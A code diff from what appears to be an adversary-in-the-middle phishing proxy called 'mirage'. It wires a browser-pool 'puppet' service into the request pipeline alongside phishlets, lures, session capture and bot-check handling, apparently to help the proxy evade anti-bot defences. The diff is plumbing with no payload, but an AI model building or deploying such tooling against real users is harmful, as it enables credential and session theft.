@@ -21,6 +21,7 @@ import (
 	"github.com/travisbale/mirage/internal/proxy"
 	"github.com/travisbale/mirage/internal/proxy/handlers/request"
 	"github.com/travisbale/mirage/internal/proxy/handlers/response"
+	"github.com/travisbale/mirage/internal/puppet"
 	"github.com/travisbale/mirage/internal/store/sqlite"
 )
 
@@ -50,6 +51,9 @@ type Daemon struct {
 	// JS obfuscator — always non-nil after New (no-op when disabled).
 	obfuscator scriptObfuscator
 
+	// Puppet service — always non-nil after New (no-op when disabled).
+	puppetSvc *aitm.PuppetService
+
 	// Services needed by health check and reload.
 	phishletSvc *aitm.PhishletService
 	sessionSvc  *aitm.SessionService
@@ -69,6 +73,7 @@ type initializer struct {
 	sessionStore  *sqlite.Sessions
 	lureSvc       *aitm.LureService
 	blacklistSvc  *aitm.BlacklistService
+	puppetSvc     *aitm.PuppetService
 	spoofProxy    *proxy.SpoofProxy
 	wsHub         *proxy.WSHub
 }
@@ -245,7 +250,38 @@ func (ini *initializer) initServices() error {
 		return fmt.Errorf("loading lures: %w", err)
 	}
 
+	ini.puppetSvc = ini.initPuppet()
+	ini.puppetSvc.Start()
+	ini.Daemon.puppetSvc = ini.puppetSvc
+
 	return nil
+}
+
+func (ini *initializer) initPuppet() *aitm.PuppetService {
+	cfg := ini.cfg.Puppet
+	builder := &puppet.OverrideBuilder{}
+	svcCfg := aitm.PuppetServiceConfig{
+		CacheTTL:      cfg.CacheTTL,
+		NavTimeout:    cfg.NavTimeout,
+		MaxConcurrent: cfg.MaxInstances,
+	}
+	newNoOp := func() *aitm.PuppetService {
+		return aitm.NewPuppetService(&puppet.NoOpCollector{}, builder, ini.bus, svcCfg, ini.logger)
+	}
+
+	if !cfg.Enabled {
+		ini.logger.Info("puppet service disabled")
+		return newNoOp()
+	}
+
+	pool, err := puppet.NewPool(cfg, ini.logger)
+	if err != nil {
+		ini.logger.Warn("puppet pool unavailable, falling back to no-op", "error", err)
+		return newNoOp()
+	}
+
+	collector := puppet.NewCollector(pool, cfg.NavTimeout, ini.logger)
+	return aitm.NewPuppetService(collector, builder, ini.bus, svcCfg, ini.logger)
 }
 
 func (ini *initializer) initProxy(version string) error {
@@ -281,6 +317,7 @@ func (ini *initializer) initProxy(version string) error {
 		apiHandler:       apiHandler,
 		apiHostname:      ini.cfg.API.SecretHostname,
 		obfuscator:       ini.obfuscator,
+		puppetSvc:        ini.puppetSvc,
 	}, ini.logger)
 
 	aitmProxy := &proxy.AITMProxy{
@@ -446,6 +483,7 @@ type pipelineDeps struct {
 	apiHandler       *api.Router
 	apiHostname      string
 	obfuscator       scriptObfuscator
+	puppetSvc        *aitm.PuppetService
 }
 
 func buildPipeline(d pipelineDeps, logger *slog.Logger) *proxy.Pipeline {
@@ -475,6 +513,9 @@ func buildPipeline(d pipelineDeps, logger *slog.Logger) *proxy.Pipeline {
 			},
 			&request.SessionResolver{
 				Sessions: d.sessionSvc,
+			},
+			&request.PuppetOverrideResolver{
+				Source: d.puppetSvc,
 			},
 			&request.TelemetryScoreCheck{
 				Scorer:    d.botGuardSvc,
